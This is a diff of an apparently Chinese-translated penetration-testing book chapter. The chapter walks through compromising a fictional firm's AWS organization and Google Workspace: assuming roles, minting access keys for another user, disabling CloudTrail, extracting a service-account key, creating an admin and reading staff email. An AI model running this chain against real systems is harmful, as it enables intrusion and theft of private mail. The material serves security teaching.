@@ -1,6 +1,4 @@
-# 13
-
-最终剪辑
+# 最终剪辑
 
 ![](img/chapterart.png)
 
@@ -19,7 +17,7 @@ AWS 则不同。它从未打算征服企业 IT 市场。这个市场已经被像
 快速查看 DNS 邮件交换（MX）记录可以发现，GP 确实在使用企业版 Gmail，因此可能还在使用 Google Workspace 中的其他工具，比如 Drive、Contacts、Hangouts 等（见 Listing 13-1）。
 
 ```
-root@Point1:~/# **dig +short gretschpolitico.com MX**
+root@Point1:~/# dig +short gretschpolitico.com MX
 10 aspmx.l.google.com.
 20 alt2.aspmx.l.google.com.
 30 aspmx3.googlemail.com.
@@ -54,8 +52,8 @@ g = Github("8e24ffcc0eeddee673ffa0ce5433ffcee7ace561")
 for repo in g.get_user().get_repos():
     print(repo.name, repo.clone_url)
 
-root@Point1:~/# **python3 list_repos.py > list_repos_gp.txt**
-root@Point1:~/# **egrep -i "it[-_]|gapps|gsuite|users?" list_repos_gp.txt**
+root@Point1:~/# python3 list_repos.py > list_repos_gp.txt
+root@Point1:~/# egrep -i "it[-_]|gapps|gsuite|users?" list_repos_gp.txt
 
 it-service     https://github.com/gretschp/it-service.git
 1 it-gsuite-apps https://github.com/gretschp/it-gsuite-apps.git
@@ -66,7 +64,7 @@ users-sync     https://github.com/gretschp/users-sync
 这是跨领域合作的明显迹象 1。我们克隆了 it-gsuite-apps 的源代码，结果……你猜怎么着？！这是一个用于自动化许多 Google Workspace 管理员操作的应用程序和服务的列表，如用户配置、组织单元（OU）分配、账户终止等：
 
 ```
-root@Point1:~/# **ls -lh it-gsuite-apps**
+root@Point1:~/# ls -lh it-gsuite-apps
 
 total 98M
 drwxrwxrwx 1 root root   7.9M  provisionner
@@ -84,7 +82,7 @@ drwxrwxrwx 1 root root   6.3M  assign-ou
 机器无法遵循这种认证流程，因此 Google 还提供了服务账户，可以使用私钥进行身份验证。然而，在查看源代码时，我们并没有发现任何关于私钥的线索：
 
 ```
-root@Point1:~/it-gsuite-apps/# **grep -Ri "BEGIN PRIVATE KEY" ***
+root@Point1:~/it-gsuite-apps/# grep -Ri "BEGIN PRIVATE KEY" *
 root@Point1:~/it-gsuite-apps/#
 ```
 
@@ -108,7 +106,7 @@ public static void getSecret(String token) {
 现在一切都明了。秘密并没有硬编码在应用中，而是通过 AWS 的 Secrets Manager 动态获取的，Secrets Manager 是一个用于集中存储秘密的服务。我们不知道秘密的名称，但幸运的是，我们拥有完整的管理员权限，所以我们可以轻松搜索：
 
 ```
-root@Point1:~/# **aws secretsmanager list-secrets \**
+root@Point1:~/# aws secretsmanager list-secrets \
 **--region eu-west-1 \**
 **--profile rundeck**
 
@@ -128,7 +126,7 @@ root@Point1:~/# **aws secretsmanager list-secrets \**
 主账户通常不包含任何基础设施，应该——在理想的情况下——将日志聚合、账单报告等管理任务委托给其他账户。我们可以通过调用 `list-accounts` AWS API，使用我们功能强大的 rundeck 角色（见清单 13-3），轻松确认我们的假设。
 
 ```
-root@Point1:~/# **aws organizations list-accounts**
+root@Point1:~/# aws organizations list-accounts
 "Accounts": 
    Id: 983457354409, Name: GP Infra, Email: infra-admin@gre...
    Id: 354899546107, Name: GP Lab, Email: gp-lab@gretschpoli...
@@ -143,7 +141,7 @@ root@Point1:~/# **aws organizations list-accounts**
 在创建成员账户时，AWS 会自动分配一个名为 *OrganizationAccountAccessRole* 的默认角色。这个角色的默认信任策略允许任何管理账户的用户假扮该角色，并能够调用安全令牌服务（STS）`assume-role` API。让我们看看是否能获取到它的凭证：
 
 ```
-root@Point1:~/# **aws sts assume-role \**
+root@Point1:~/# aws sts assume-role \
 **--role-session-name maintenance \**
 **--role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole \**
 **--profile rundeck**
@@ -160,7 +158,7 @@ An error occurred (AccessDenied) when calling the AssumeRole operation...
 首先，我们获取聚合 CloudTrail 日志的日志组名称：
 
 ```
-root@Point1:~/# **aws logs describe-log-groups \**
+root@Point1:~/# aws logs describe-log-groups \
 **--region=eu-west-1 \**
 **--profile test**
 --`snip`--
@@ -198,7 +196,7 @@ root@Point1**:~/# aws logs filter-log-events \**
 看起来*elis.skyler* 1 几小时前假扮了 OrganizationAccountAccessRole。是时候为这个账户添加一个额外的访问密钥，让我们可以自己假扮该角色了。当然，在这个操作过程中，我们将暂时关闭 CloudTrail，但我会省略代码，因为你已经在第十一章了解了这种技术：
 
 ```
-root@Point1:~/# **aws iam create-access-key \**
+root@Point1:~/# aws iam create-access-key \
 **--user-name elis.skyler \**
 **--profile rundeck**
 
@@ -211,7 +209,7 @@ AccessKey: {
 使用这些新的凭据，我们请求属于 OrganizationAccountAccessRole 的临时 AWS 密钥：
 
 ```
-root@Point1:~/# **aws sts assume-role \**
+root@Point1:~/# aws sts assume-role \
 **--role-session-name maintenance \**
 **--role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole \**
 **--profile elis \**
@@ -225,7 +223,7 @@ SessionToken: FwoGZXIvYXdzEGwa...
 其实并没有那么难。好了，让我们使用这些访问凭据在这个新账户中查找 AWS Secrets Manager：
 
 ```
-root@Point1:~/# **aws secretsmanager list-secrets \**
+root@Point1:~/# aws secretsmanager list-secrets \
 **--region eu-west-1 \**
 **--profile it-role**
 
@@ -239,7 +237,7 @@ Name: it/gsuite-apps/user-provisioning,
 太棒了。我们获取密钥内容并解码，以检索用于验证 Google 服务账户的 JSON 文件（参见列表 13-5）。
 
 ```
-root@Point1:~/# **aws secretsmanager get-secret-value \**
+root@Point1:~/# aws secretsmanager get-secret-value \
 **--secret-id 'arn:aws:secretsmanager:eu-west-1:345673068670:secret:it/ \**
 **gsuite-apps/user-provisionning-4OYxPA' \**
 **--region=eu-west-1 \**
@@ -308,7 +306,7 @@ service.users().makeAdmin(userKey="hanielle@gretschpolitico.com",
 现在我们只需运行文件：
 
 ```
-root@Point1:~/# **python create_user.py**
+root@Point1:~/# python create_user.py
 ```
 
 没有错误。真的成功了吗？我们打开浏览器，访问 Google Workspace 管理员控制台，[`admin.google.com/`](https://admin.google.com/)，如图 13-1 所示。
@@ -354,7 +352,7 @@ messages = results.get('messages', [])
 然后，只需遍历邮件，提取主题、发件人、收件人和邮件正文。查看完整代码：[`github.com/HackLikeAPornstar/GreschPolitico`](https://github.com/HackLikeAPornstar/GreschPolitico)。我们运行完整的 Python 脚本，悠闲地浏览邮件：
 
 ```
-root@Point1:~/# **python gmail.py**
+root@Point1:~/# python gmail.py
 alexandra.styx@gretschpolitico.com;
 valery.attenbourough@gretschpolitico.com;
 Sun, 15 Dec 2020;
